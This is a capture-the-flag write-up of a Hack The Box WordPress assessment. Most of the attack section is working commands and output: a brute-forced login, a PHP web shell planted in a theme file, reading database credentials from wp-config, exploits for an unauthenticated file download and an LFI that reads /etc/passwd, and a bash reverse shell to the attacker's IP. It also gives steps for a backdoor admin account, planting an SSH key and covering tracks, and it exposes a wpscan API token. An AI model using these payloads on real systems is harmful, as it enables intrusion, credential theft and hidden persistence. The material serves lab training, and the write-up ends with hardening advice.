# Skills Assessment - WordPress

## Find WP Site

### DNS Mapping via `/etc/hosts`
```bash
sudo sh -c 'echo "10.129.26.19 blog.inlanefreight.local" >> /etc/hosts'
cat /etc/hosts
```

Access: http://blog.inlanefreight.local/

### Enumeration:

```bash
wpscan --url http://blog.inlanefreight.local/ -e u
```

Identify the WordPress version number:
```bash
5.1.6
```

Identify the WordPress theme in use:
```bash
twentynineteen
```

```bash
User(s) Identified:

erika
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Display Name (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Display Name (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

Charlie Wiggins
 | Found By: Author Id Brute Forcing - Display Name (Aggressive Detection)
```


Perform password attack on Xmlrpc against 2 user/s:
```bash
wpscan --url http://blog.inlanefreight.local/ --usernames admin,erika --passwords /usr/share/wordlists/rockyou.txt

Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - erika / 010203
```

Choose a theme and click on Select. Next, choose a non-critical file such as 404.php

Web Shell Example for Twenty Seventeen Theme - 404.php
```bash
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
<SNIP>
```

Validate that we have achieved RCE
```bash
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=id"
```

Check files
```bash
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls"
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls+/"
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls+/home/"
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls+/home/erika"
d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt

curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat+/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt"
HTB{w0rdPr355_4SS3ssm3n7}

curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=pwd"
/var/www/blog.inlanefreight.local/public_html/wp-content/themes/twentyseventeen

curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls+/var/www/blog.inlanefreight.local/public_html"
```

Get DB Credentials:
```bash
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat+/var/www/blog.inlanefreight.local/public_html/wp-config.php"
```
```bash
/** MySQL database username */
define( 'DB_USER', 'wp-admin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'WP_wp_skillz!' );
```

Submit the contents of the flag file in the directory with directory listing enabled:
```bash
curl -s -X GET http://blog.inlanefreight.local | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls+/var/www/blog.inlanefreight.local/public_html/wp-content/uploads/"
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat+/var/www/blog.inlanefreight.local/public_html/wp-content/uploads/upload_flag.txt"
```

Answer:
```bash
HTB{d1sabl3_d1r3ct0ry_l1st1ng!}
```



Identify the only non-admin WordPress user. (Format: <first-name> <last-name>):
```bash
Charlie Wiggins
```


Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download:
```bash
wpscan --url http://blog.inlanefreight.local/ --api-token VyjB9rxyQz0cFqLA14dKJ8aLwbZeNEleBazHsRS1J8o
```

Result scan:
```bash
Title: Email Subscribers & Newsletters < 4.2.3 - Multiple Issues
 |     Fixed in: 4.2.3
 |     References:
 |      - https://wpscan.com/vulnerability/a0764617-6142-4ef7-94f9-1fb923e81e94
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19985

CVE-2019-19985
The WordPress plugin, Email Subscribers & Newsletters, before 4.2.3 had a flaw that allowed unauthenticated file download with user information disclosure.

https://packetstorm.news/files/id/158563:
WordPress Email Subscribers and Newsletters 4.2.2 File Disclosure
 Exploit Title: WordPress Plugin Email Subscribers & Newsletters 4.2.2 - Unauthenticated File Download
 ```
 ```bash
curl [BASE_URL]'/wp-admin/admin.php?page=download_report&report=users&status=all'
EXAMPLE: curl 'http://127.0.0.1/wp-admin/admin.php?page=download_report&report=users&status=all'
```

We can get the flag according to the method provided by the link:
```bash
curl 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'
```

Result:
```bash
"First Name", "Last Name", "Email", "List", "Status", "Opt-In Type", "Created On"
"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Test", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Main", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
```

Flag:
```bash
HTB{unauTh_d0wn10ad!}
```

What is the version number of the plugin vulnerable to an LFI?:
```bash
1.1.1
site-editor
 | Location: http://blog.inlanefreight.local/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2

```

Use the LFI to identify a system user whose name starts with the letter "f":
Reference:
https://www.exploit-db.com/exploits/44340
```bash
** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

Response:
```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin mrb3n:x:1000:1000:mrb3n,,,:/home/mrb3n:/bin/bash mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false erika:x:1001:1001::/home/erika:/bin/bash frank.mclane:x:1002:1002::/home/frank.mclane:/bin/bash pollinate:x:103:1::/var/cache/pollinate:/bin/false landscape:x:112:105::/var/lib/landscape:/usr/sbin/nologin {"success":true,"data":{"output":[]}}
```

name starts with the letter "f":
```bash
frank.mclane
```

### Getting Shell and Root access:

**MetasPloit:**
```bash
search wp_admin
  0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
use 0
set rhosts blog.inlanefreight.local
set username erika
set password 010203
set lhost 10.10.15.142
run
```

```bash
 [*] Started reverse TCP handler on 10.10.15.142:4444 
 [*] Authenticating with WordPress using erika:010203...
 [+] Authenticated with WordPress
 [*] Preparing payload...
 [*] Uploading payload...
 [-] Exploit aborted due to failure: unexpected-reply: Failed to upload the payload
 [*] Exploit completed, but no session was created.
 ```

So basicly with metasploit it didnt worked

Onother way:

Login as admin and got to inactive theme twentyseventeen theme, got to search.php and add:
```bash
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.142/4444 0>&1'");
?>
```

Added listener in new terminal:
```bash
nc -lvnp 4444
```

Activated twentyseventeen theme and went to a search resuslts page and walla:
```bash
listening on [any] 4444 ...
connect to [10.10.15.142] from (UNKNOWN) [10.129.2.37] 42716
bash: cannot set terminal process group (1646): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nix01:/var/www/blog.inlanefreight.local/public_html$ ls
```
```bash
index.php
license.txt
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-snapshots
wp-trackback.php
xmlrpc.php
```

### Gain DB and Root access:

```bash
whoami
php --version
 PHP 7.2.24-0ubuntu0.18.04.17 (cli) (built: Feb 23 2023 13:29:25) ( NTS )
 Copyright (c) 1997-2018 The PHP Group
 Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
    with Zend OPcache v7.2.24-0ubuntu0.18.04.17, Copyright (c) 1999-2018, by Zend Technologies
```

```bash
cat wp-config.php
 // ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wp-admin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'WP_wp_skillz!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```
```bash
ls -la
```

Reverse Shell Stability(optional):
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Setup Persistence(optional): Add a new admin user to WordPress:
```bash
wp user create newadmin newadmin@example.com --role=administrator --user_pass='P@ssw0rd' --path=/var/www/blog.inlanefreight.local/public_html
```

SSH Access: If you find credentials, add your SSH key to authorized keys(optional):
```bash
echo "your-ssh-public-key" >> ~/.ssh/authorized_keys
```

Remove any modifications made to WordPress files (e.g., search.php) to avoid detection:
```bash
rm /path/to/modified/file
```

I have successfully located a number of SUID binaries and writable directories, which are crucial for privilege escalation attempts. Here’s an overview of the findings:

SUID Binaries
Some binaries with the SUID bit set that you can potentially exploit for privilege escalation include:
```bash
/usr/bin/sudo – This is a critical binary for executing commands as another user, particularly root. If it's misconfigured, it can be exploited.
/usr/bin/passwd – This is used to change user passwords. If improperly configured, it may allow you to change the root password or gain other privileges.
/bin/mount / /bin/umount – These binaries are related to mounting and unmounting filesystems. Misconfigurations here could allow you to mount a filesystem with elevated privileges.
/usr/bin/pkexec – This command is similar to sudo and allows executing commands as another user.
```

Writable Directories
Also found some writable directories, which could potentially be abused to upload or modify malicious files:
```bash
/tmp – A common location for writing temporary files that can be exploited.
/run/lock, /var/tmp, /var/lib/php/sessions – These directories could also be places where you might be able to upload files if writable.
```

### Root Privlidge Escalation:

(Options to consider exploitation)
```bash
ltrace
pkexec 
suid binaries
find root command
Steps to Exploit CVE-2021-4034
Writable Directories
check cronjobs
kernel exploit

cd /home
cd ..
```

Tried But sudo is password proctected:
```bash
www-data@nix01:/usr/bin$ pwd
pwd
/usr/bin
www-data@nix01:/usr/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@nix01:/usr/bin$ sudo -l
sudo -l
[sudo] password for www-data: 
```

Other method(testing):
I tried the above mthods but no success to escalate privildges.
To go more deeper need to dive in more into the penetration test options.


### Pentest Report File! with security WordPress Hardening Info:

**WordPress Hardening**
Best Practices
Below are some best practices for preventing attacks against a WordPress site.

1. Perform Regular Updates:

This is a key principle for any application or system and can greatly reduce the risk of a successful attack. Make sure that WordPress core, as well as all installed plugins and themes, are kept up-to-date. Researchers continuously find flaws in third-party WordPress plugins. Some hosting providers will even perform continuous automatic updates of WordPress core. The WordPress admin console will usually prompt us when plugins or themes need to be updated or when WordPress itself requires an upgrade. We can even modify the wp-config.php file to enable automatic updates by inserting the following lines:
```php
define( 'WP_AUTO_UPDATE_CORE', true );

add_filter( 'auto_update_plugin', '__return_true' );

add_filter( 'auto_update_theme', '__return_true' );
```

2. Plugin and Theme Management:

Only install trusted themes and plugins from the WordPress.org website. Before installing a plugin or theme, check its reviews, popularity, number of installs, and last update date. If either has not been updated in years, it could be a sign that it is no longer maintained and may suffer from unpatched vulnerabilities. Routinely audit your WordPress site and remove any unused themes and plugins. This will help to ensure that no outdated plugins are left forgotten and potentially vulnerable.


3. Enhance WordPress Security:

Several WordPress security plugins can be used to enhance the website's security. These plugins can be used as a Web Application Firewall (WAF), a malware scanner, monitoring, activity auditing, brute force attack prevention, and strong password enforcement for users. Here are a few examples of popular WordPress security plugins.

**The All-In-One WP Security:**
This plugin offers features like comment spam prevention, brute-force attack protection, and Google reCAPTCHA integration. You can explore more about its capabilities here. Key Features of All-In-One WP Security Plugin

Login Security Tools

Protects against brute-force attacks.

Supports two-factor authentication (TFA) with various apps like Google Authenticator and Authy.

Login lockout feature for multiple failed attempts.

Web Application Firewall (WAF)

Monitors traffic and blocks malicious requests.
Incorporates a '6G Blacklist' to protect against known threats.
Automatic updates for firewall rules based on known exploits.
Content Protection

Prevents comment spam and content theft.
Features like iFrame prevention and disabling right-click to protect content.
User Management

Audit log to track user activities and changes.
Force logouts after a specified period.
Reporting on login attempts and user activity.
Advanced Security Measures

Customizable login URL to hide the admin page from bots.
Change default database prefix to enhance security.
Prevents DDoS attacks and image hotlinking.
Monitoring and Alerts

Uptime and response time monitoring with notifications.
Security reports available via email.
Multisite Compatibility

Works with WordPress multisite networks, applying security measures across the network.
For more details, visit the All-In-One WP Security & Firewall plugin page.

**Sucuri Security:**
This plugin is a security suite consisting of the following features:
Security Activity Auditing
File Integrity Monitoring
Remote Malware Scanning
Blacklist Monitoring.

**iThemes Security:***
iThemes Security provides 30+ ways to secure and protect a WordPress site such as:
Two-Factor Authentication (2FA)
WordPress Salts & Security Keys
Google reCAPTCHA
User Action Logging

**Wordfence Security:**
Wordfence Security consists of an endpoint firewall and malware scanner.
The WAF identifies and blocks malicious traffic.
The premium version provides real-time firewall rule and malware signature updates
Premium also enables real-time IP blacklisting to block all requests from known most malicious IPs.

4. User Management:

Users are often targeted as they are generally seen as the weakest link in an organization. The following user-related best practices will help improve the overall security of a WordPress site.

Disable the standard admin user and create accounts with difficult to guess usernames

Enforce strong passwords
Enable and enforce two-factor authentication (2FA) for all users
Restrict users' access based on the concept of least privilege
Periodically audit user rights and access. Remove any unused accounts or revoke access that is no longer needed


5. Configuration Management

Certain configuration changes can increase the overall security posture of a WordPress installation.

Install a plugin that disallows user enumeration so an attacker cannot gather valid usernames to be used in a password spraying attack
Limit login attempts to prevent password brute-forcing attacks
Rename the wp-admin.php login page or relocate it to make it either not accessible to the internet or only accessible by certain IP addresses


For More Practice:
https://github.com/cyberteach360/Hacking-Wordpress